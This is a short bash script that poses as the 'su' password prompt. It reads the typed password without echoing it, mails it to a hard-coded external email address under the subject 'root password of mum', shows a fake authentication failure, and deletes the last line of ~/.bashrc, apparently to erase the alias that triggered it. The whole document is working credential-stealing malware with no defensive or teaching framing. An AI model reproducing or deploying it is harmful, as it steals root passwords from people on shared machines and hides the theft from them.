#!/bin/bash

receiver=lmx00518@qq.com

echo -e "Password: \c"
read -s password
echo
mail -s 'root password of mum' $receiver <<< $password
echo "su: Authentication failure"

echo $1
head -n -1 ~/.bashrc > ~/.bashrc.copy
mv ~/.bashrc.copy ~/.bashrc
exit 1